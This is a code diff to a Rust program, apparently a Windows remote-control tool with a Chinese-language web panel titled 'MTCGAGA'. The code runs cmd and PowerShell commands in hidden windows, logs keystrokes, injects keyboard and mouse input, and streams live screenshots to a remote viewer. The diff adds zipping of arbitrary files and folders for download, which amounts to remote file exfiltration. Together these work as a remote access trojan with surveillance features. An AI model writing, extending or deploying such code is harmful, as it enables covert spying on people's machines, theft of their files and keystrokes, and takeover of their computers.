@@ -6,112 +6,66 @@ use axum::{
     routing::{get, post},
     serve,
 };
-use axum_extra::extract::Form;
+use axum_extra::{extract::Form, response::Attachment};
 use device_query::{DeviceEvents, DeviceEventsHandler};
 use enigo::{Axis, Button, Coordinate, Direction, Enigo, Keyboard, Mouse, Settings};
 use rdev::{EventType, Key, listen, simulate};
 use std::{
     env::args,
-    fs::OpenOptions,
-    io::{Cursor, Read, Seek, SeekFrom, Write},
+    fs::{File, OpenOptions, read_dir, symlink_metadata},
+    io::{Cursor, Read, Seek, SeekFrom, Write, copy},
     os::windows::fs::OpenOptionsExt,
+    path::Path,
     sync::{Arc, Mutex},
 };
 use tokio::{net::TcpListener, process::Command, spawn, time::Duration};
-use xcap::{Monitor, image::ImageFormat};
-const FORM: &'static str = r#"<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>MTCGAGA</title>
-    <script>
-        // 更新 input 的 name 为下拉框选中的值
-        function updateName(select) {
-            const input = select.parentElement.querySelector('input[type="text"]');
-            if (input)
-                input.name = select.value;
-        }
-        // 在当前项之后插入一个新项
-        function addAfter(btn) {
-            const currentItem = btn.parentElement;          // 当前所在的 <div>
-            const form = document.querySelector('form');    // 获取表单
-            const div = document.createElement('div');
-            div.innerHTML = `
-                <select onchange="updateName(this)">
-                    <option value="cmd">运行 Powershell 命令</option>
-                    <option value="clr">清空按键记录</option>
-                    <option value="txt">键入文本</option>
-                    <option value="mre">鼠标相对移动</option>
-                    <option value="mab">鼠标绝对移动</option>
-                    <option value="scr">滑动鼠标滚轮</option>
-                    <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
-                    <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
-                </select>
-                <input type="text" name="cmd" placeholder="请输入参数……">
-                <button type="button" onclick="addAfter(this)">添加</button>
-                <button type="button" onclick="removeItem(this)">删除</button>
-            `;
-            form.insertBefore(div, currentItem.nextSibling);
-            // 初始化新项的 input.name
-            const newSelect = div.querySelector('select');
-            const newInput = div.querySelector('input[type="text"]');
-            if (newSelect && newInput) {
-                newInput.name = newSelect.value;
-            }
-        }
-        // 删除当前项，但至少保留一项
-        function removeItem(btn) {
-            const item = btn.parentElement;
-            const form = document.querySelector('form');
-            const items = form.querySelectorAll('div');
-            if (items.length > 1) {
-                item.remove();
-            } else {
-                alert('至少保留一项');
-            }
-        }
+use webp_screenshot_rust::{CaptureConfig, WebPScreenshot};
+use zip::{ZipWriter, write::FileOptions};
 
-        // 页面加载后，初始化所有现有项的 input.name
-        window.onload = function() {
-            document.querySelectorAll('form div select').forEach(select => {
-                updateName(select);
-            });
+fn add_to_zip(
+    zip: &mut ZipWriter<&mut Cursor<Vec<u8>>>,
+    dir: &Path,
+    base: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let metadata = symlink_metadata(dir)?;
+
+    if metadata.is_file() {
+        // 处理文件
+        let file_name = dir.file_name().unwrap().to_string_lossy();
+        let zip_path = if base.is_empty() {
+            file_name.to_string()
+        } else {
+            format!("{}/{}", base, file_name)
         };
-    </script>
-</head>
-<body>
-    <form action="/" method="post">
-        <!-- 初始项 -->
-        <div>
-            <select onchange="updateName(this)">
-                <option value="cmd">运行 Powershell 命令</option>
-                <option value="clr">清空按键记录</option>
-                <option value="txt">键入文本</option>
-                <option value="mre">鼠标相对移动</option>
-                <option value="mab">鼠标绝对移动</option>
-                <option value="scr">滑动鼠标滚轮</option>
-                <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
-                <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
-            </select>
-            <input type="text" name="cmd" placeholder="请输入参数……">
-            <button type="button" onclick="addAfter(this)">添加</button>
-            <button type="button" onclick="removeItem(this)">删除</button>
-        </div>
-        <button type="submit">提交</button>
-    </form>
-    <pre style="white-space:pre-wrap">"#;
-const IMAGE: &'static str = r#"</pre>
-<img src='screen.bmp'>
-<script>
-    const ws = new WebSocket('screen.bmp');
-    const img = document.querySelector('img');
-    ws.onmessage = (e) => {
-        if (e.data instanceof Blob)
-            img.src = URL.createObjectURL(event.data)
+        zip.start_file::<String, ()>(zip_path, FileOptions::default())?;
+        let mut src = File::open(dir)?;
+        copy(&mut src, zip)?;
+    } else if metadata.is_dir() {
+        // 处理目录
+        let dir_name = dir.file_name().unwrap().to_string_lossy();
+        let zip_dir = if base.is_empty() {
+            format!("{}/", dir_name)
+        } else {
+            format!("{}/{}/", base, dir_name)
+        };
+        zip.add_directory::<String, ()>(zip_dir, FileOptions::default())?;
+
+        // 更新 base 供子项使用
+        let new_base = if base.is_empty() {
+            dir_name.to_string()
+        } else {
+            format!("{}/{}", base, dir_name)
+        };
+
+        // 递归处理所有子项
+        for entry in read_dir(dir)? {
+            let entry = entry?;
+            let path = entry.path();
+            add_to_zip(zip, &path, &new_base)?;
+        }
     }
-</script>
-</body>
-</html>"#;
+    Ok(())
+}
 #[tokio::main]
 async fn main() {
     let mut arg = args();
@@ -180,13 +134,23 @@ async fn main() {
             .route(
                 "/",
                 post(async move |Form(frm): Form<Vec<(String, String)>>| {
+                    let mut buf = Cursor::new(Vec::new());
+                    let mut zip = ZipWriter::new(&mut buf);
                     for (a, b) in frm {
                         match &a[..] {
                             "cmd" => {
+                                Command::new("cmd")
+                                    .creation_flags(0x08000000)
+                                    .arg("/c")
+                                    .arg(b)
+                                    .spawn()
+                                    .unwrap();
+                            }
+                            "pow" => {
                                 Command::new("powershell")
                                     .creation_flags(0x08000000)
                                     .arg("-Command")
-                                    .arg(&b)
+                                    .arg(b)
                                     .spawn()
                                     .unwrap();
                             }
@@ -199,6 +163,7 @@ async fn main() {
                                 g.seek(SeekFrom::Start(0)).unwrap();
                             }
                             "txt" => enigo.lock().unwrap().text(&b).unwrap(),
+                            "zip" => add_to_zip(&mut zip, b.as_ref(), "").unwrap(),
                             "mre" => {
                                 let mut parts = b.split_whitespace();
                                 enigo
@@ -273,7 +238,8 @@ async fn main() {
                             _ => (),
                         }
                     }
-                    Html("<script>window.location.href=''</script>")
+                    zip.finish().unwrap();
+                    Attachment::new(buf.into_inner())
                 })
                 .get(async move || {
                     let mut f = lck1.lock().unwrap();
@@ -284,21 +250,118 @@ async fn main() {
                     let mut t = String::new();
                     f.read_to_string(&mut s).unwrap();
                     g.read_to_string(&mut t).unwrap();
-                    Html(FORM.to_string() + &s + "<hr>" + &t + IMAGE)
+                    Html(format!(r#"<!DOCTYPE html>
+                    <html>
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>MTCGAGA</title>
+                        <script>
+                            // 更新 input 的 name 为下拉框选中的值
+                            function updateName(select) {{
+                                const input = select.parentElement.querySelector('input[type="text"]');
+                                if (input)
+                                    input.name = select.value;
+                            }}
+                            // 在当前项之后插入一个新项
+                            function addAfter(btn) {{
+                                const currentItem = btn.parentElement;          // 当前所在的 <div>
+                                const form = document.querySelector('form');    // 获取表单
+                                const div = document.createElement('div');
+                                div.innerHTML = `
+                                    <select onchange="updateName(this)">
+                                        <option value="cmd">运行命令提示符命令</option>
+                                        <option value="pow">运行 Powershell 命令</option>
+                                        <option value="clr">清空按键记录</option>
+                                        <option value="txt">键入文本</option>
+                                        <option value="zip">下载文件</option>
+                                        <option value="mre">鼠标相对移动</option>
+                                        <option value="mab">鼠标绝对移动</option>
+                                        <option value="scr">滑动鼠标滚轮</option>
+                                        <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
+                                        <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
+                                    </select>
+                                    <input type="text" name="cmd" placeholder="请输入参数……">
+                                    <button type="button" onclick="addAfter(this)">添加</button>
+                                    <button type="button" onclick="removeItem(this)">删除</button>
+                                `;
+                                form.insertBefore(div, currentItem.nextSibling);
+                                // 初始化新项的 input.name
+                                const newSelect = div.querySelector('select');
+                                const newInput = div.querySelector('input[type="text"]');
+                                if (newSelect && newInput) {{
+                                    newInput.name = newSelect.value;
+                                }}
+                            }}
+                            // 删除当前项，但至少保留一项
+                            function removeItem(btn) {{
+                                const item = btn.parentElement;
+                                const form = document.querySelector('form');
+                                const items = form.querySelectorAll('div');
+                                if (items.length > 1) {{
+                                    item.remove();
+                                }} else {{
+                                    alert('至少保留一项');
+                                }}
+                            }}
+                            window.onload = function() {{
+                                document.querySelectorAll('form div select')
+                                    .forEach(select => updateName(select));
+                            }};
+                        </script>
+                    </head>
+                    <body>
+                        <form action="/" method="post">
+                            <!-- 初始项 -->
+                            <div>
+                                <select onchange="updateName(this)">
+                                    <option value="cmd">运行命令提示符命令</option>
+                                    <option value="pow">运行 Powershell 命令</option>
+                                    <option value="clr">清空按键记录</option>
+                                    <option value="txt">键入文本</option>
+                                    <option value="zip">下载文件</option>
+                                    <option value="mre">鼠标相对移动</option>
+                                    <option value="mab">鼠标绝对移动</option>
+                                    <option value="scr">滑动鼠标滚轮</option>
+                                    <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
+                                    <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
+                                </select>
+                                <input type="text" name="cmd" placeholder="请输入参数……">
+                                <button type="button" onclick="addAfter(this)">添加</button>
+                                <button type="button" onclick="removeItem(this)">删除</button>
+                            </div>
+                            <button type="submit">提交</button>
+                        </form>
+                        <pre style="white-space:pre-wrap">{}<hr>{}</pre>
+                        <img src='screen.webp'>
+                        <script>
+                            const ws = new WebSocket('screen.webp');
+                            const img = document.querySelector('img');
+                            ws.onmessage = (e) => {{
+                                if (e.data instanceof Blob)
+                                    img.src = URL.createObjectURL(event.data)
+                            }}
+                        </script>
+                    </body>
+                    </html>"#, s, t))
                 }),
             )
             .route(
-                "/screen.bmp",
+                "/screen.webp",
                 get(async |ws: WebSocketUpgrade| {
                     ws.on_upgrade(async |mut sk| {
                         loop {
-                            let mut buf = Cursor::new(Vec::new());
-                            Monitor::all().unwrap()[0]
-                                .capture_image()
+                            sk.send(Message::from(
+                                WebPScreenshot::with_config(CaptureConfig {
+                                    include_cursor: true,
+                                    ..Default::default()
+                                })
                                 .unwrap()
-                                .write_to(&mut buf, ImageFormat::Bmp)
-                                .unwrap();
-                            sk.send(Message::from(buf.into_inner())).await.unwrap();
+                                .capture_display(0)
+                                .unwrap()
+                                .data,
+                            ))
+                            .await
+                            .unwrap();
                         }
                     })
                 }),
